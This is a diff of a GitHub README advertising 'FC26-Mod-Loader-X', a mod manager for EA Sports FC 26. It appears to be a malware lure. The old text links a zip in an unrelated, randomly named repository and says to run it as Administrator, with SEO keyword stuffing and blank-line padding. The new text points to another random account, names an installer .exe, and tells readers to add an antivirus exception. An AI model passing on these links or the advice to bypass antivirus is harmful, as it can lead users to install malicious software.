@@ -1,126 +1,70 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/fifa.png" alt="EA Sports FC 26" width="80" height="80">
-</p>
+# ⚙️ FC26-Mod-Loader-X - Manage your game mods with ease
 
-<h1 align="center">FC26-Mod-Loader-X</h1>
-<p align="center">
-  <strong>Ultimate Mod Loader for EA Sports FC 26</strong><br>
-  Preset Manager - BepInEx - Live Editor - Profile Management
-</p>
+[![](https://img.shields.io/badge/Download-FC26_Mod_Loader_X-blue)](https://github.com/Sufficient-cherubini752/FC26-Mod-Loader-X)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/FC26-Mod-Loader-X"><img src="https://img.shields.io/badge/version-2.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+This software helps you install and manage mods for EA Sports FC 26. It handles file injections so you can change game textures, squads, and gameplay settings safely. The loader runs in the background and sets up your game configurations before you start playing. 
 
-## What is This?
+## 📋 What this tool does
 
-FC26-Mod-Loader-X is the ultimate mod loader for EA Sports FC 26. It provides a powerful interface for managing mods, loading presets, and integrating with BepInEx and Live Editor for real-time editing.
+The program organizes your mod files into a central folder. You load mods through a simple interface where you choose which files to enable. This tool integrates with BepInEx to handle code updates. It also connects with the Live Editor to apply changes while the match runs. 
 
-Disclaimer: This tool is for educational purposes only. Use at your own risk.
+Key features include:
+* Automatic mod installation for all game folders.
+* A preset manager to save different game configurations.
+* Direct support for BepInEx plugins.
+* Integration with the Live Editor for live changes.
+* Safety checks to verify your game files before launch.
 
-## Download
+## 💻 System requirements
 
-<p align="center">
-  <a href="https://github.com/Capturezastir/xzgfcfiu/releases/download/18902/FCMOD.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+Your computer needs to meet these standards to run the loader:
+* Windows 10 or Windows 11 (64-bit).
+* EA Sports FC 26 installed on your local drive.
+* 200 MB of disk space for the loader files.
+* An active internet connection for the initial setup.
 
-## Features
+## 📥 How to download and install
 
-- Preset Loader - Load reusable .fifamod presets easily
-- BepInEx Manager - One-click installation and configuration
-- Live Editor Integration - Real-time memory editing for Career Mode
-- Profile Management - Create and save different mod configurations
-- Tabbed Interface - My Mods, Mod Store, and BepInEx tabs
-- Automatic Update Checking - See when mods have updates available
+Follow these steps to set up the software on your computer.
 
-## Installation
+1. Visit this page to download the setup file: [https://github.com/Sufficient-cherubini752/FC26-Mod-Loader-X](https://github.com/Sufficient-cherubini752/FC26-Mod-Loader-X)
+2. Locate the file named `FC26-Mod-Loader-Installer.exe` in your download folder.
+3. Double-click the file to start the installation.
+4. Follow the prompts on the screen to choose your installation path. We recommend the default folder.
+5. Once the installer finishes, locate the new icon on your desktop.
 
-1. Click the download button above
-2. Extract the archive
-3. Run as Administrator
-4. Launch EA Sports FC 26
-5. Browse the Mod Store or drag & drop your mods
-6. Click Apply and launch the game
+## 🚀 Set up your mods
 
-## System Requirements
+After you install the program, you must link it to your game folder.
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | EA Sports FC 26 (Steam/EA App/Epic) |
-| RAM | 4GB minimum |
-| Storage | 100MB free space |
-| .NET | 6.0+ |
+1. Open the FC26-Mod-Loader-X application from your desktop.
+2. Go to the Settings tab in the top menu.
+3. Click the Browse button and find the folder where you installed EA Sports FC 26.
+4. Select the main game folder and click Save.
+5. The loader will now recognize your game and prepare the file path for your mods.
 
-## SEO Tags
+## 🕹️ Use the loader
 
-fc26 mod loader, ea sports fc 26 mods, fc26 mod manager, fc26 mod installer, fc26 mod organizer, fc26 mod presets, fc26 mod store, fc26 modding tool, fc26 live editor, fc26 career mode mods, fc26 visual mods, fc26 gameplay mods, fifa 26 mod manager, ea fc 26 mods, fc26 utility, fc26 enhancer
+1. Place your mod files (usually .fifamod files) into the Mods folder created by the loader.
+2. Open the loader application.
+3. You will see a list of available mods.
+4. Check the box next to each mod you want to enable.
+5. If you want to create a group of settings, go to the Preset Manager tab.
+6. Click Save Preset to keep your current selection for later use.
+7. Click the Launch Game button within the loader to start playing with your mods.
 
-## Support
+## 🛠️ Address common issues
 
-Star this repository if you enjoy it!
+If you encounter problems, look at these points:
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/FC26-Mod-Loader-X">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20EA%20Sports%20FC%2026%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+* Make sure your game is closed before you open the loader.
+* Check if your antivirus software blocks the loader. You may need to add an exception for the loader folder.
+* Verify that your game files are up to date through the EA App or Steam.
+* If a,mod fails to load, delete the cache folder inside the loader directory and try again.
+* The BepInEx logs folder contains details if the game crashes during startup. Check this folder after a crash.
+
+## 🛡️ Maintain game integrity
+
+The loader handles files in a way that protects your base game. It uses a virtual file structure. This means the original files remain unchanged in your game folder. If you ever have issues, you can close the loader and the game will revert to original settings. Always back up your save files before you install major game updates from EA Sports. While this tool works for offline modes, you should disable all mods before you try to connect to online services to avoid issues with protected servers.
+
+Keywords: EA Sports FC 26, Mod Loader, BepInEx, Live Editor, Game Mods, PC Gaming, Mod Manager
